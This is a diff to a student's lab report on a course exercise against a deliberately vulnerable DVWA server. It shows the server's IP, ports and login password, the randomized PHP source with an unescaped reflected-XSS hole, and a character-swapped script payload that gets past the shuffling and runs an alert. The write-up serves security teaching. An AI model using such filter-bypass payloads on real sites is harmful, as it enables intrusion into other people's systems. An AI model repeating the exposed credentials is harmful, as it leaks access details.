@@ -106,11 +106,68 @@ Obviously, the KYBS2001 hosted exercise might be hardened somehow so that the ex
   caption: [Common XSS payloads],
 ) <xss-payloads>
 
-According to Li, a good XSS escape test string would be `>'<"//:=;!--`.
+According to Li, a good XSS escape test string would be `>'<"//:=;!--`. Also, a lot of suitable payloads can be found from the OWASP XSS Filter Evasion Cheat Sheet: #link("https://owasp.org/www-community/xss-filter-evasion-cheatsheet")[OWASP XSS Filter Evasion Cheat Sheet].
+
+The status of the DVWA server is:
+
+```
+Student: jksouran
+Exercise: DVWA - Running
+DVWA HTTP PORT: 2789
+IP: 193.167.189.112
+MCIR HTTP PORT: 2505
+PASSWORD: jksouran81169
+SSH PORT: 2895
+```
+
+The login to DVWA was succesful with `admin:jksouran81169`. As guided in the exercise, the PHP code is known. It lacks the necessary escaping and sanitization, but does contains some randomization shuffling of potentially dangerous characters. The code is shown below.
+
+```php
+<?php
+// Randomized implementation of xss_r/source/low.php
+
+header ("X-XSS-Protection: 0");
+
+srand(hexdec(substr("a8dacf9a7c7d394ade65f13879ded6348639e17137b4dc07f198d8350f464395", 0, 16)));
+$tr_chars = "\"'\/<>()[]{}!`^~;:?+$";
+$rnd_mapping = str_split($tr_chars);
+shuffle($rnd_mapping);
+$tr_random = implode("", $rnd_mapping);
+
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    $namestr = strtr($_GET['name'], $tr_chars, $tr_random);
+    echo '<pre>Hello ' . $namestr . '</pre>';
+}
+
+?>
+```
+
+I fed the `tr_chars` string into the input field. Placing them on top of each other reveals what maps to what:
+
+```
+"\"'\/<>()[]{}!`^~;:?+$"
+        | ||  |  |        <- Interesting ones highlighted
+~+~}+{]")`/<;[>!?(\$^':~
+```
 
 == Assignment Solution
 
-TODO
+Now I have all needed information to be an 1337 h4ck3r. Thus, I can simply swap those characters in the payload and the server will shuffle them to what I need.
+
+```
+orig: <script>alert(i)</script>
+fixd: ]script!alert~1(][script!
+```
+
+#figure(
+  image("images/01-xss-success.png", width: 50%),
+  caption: [
+    The JavaScript alert succesfully run.
+  ],
+)
 
 = Assignment: DVWA Command Execution (Injection) <assignment-1>
 
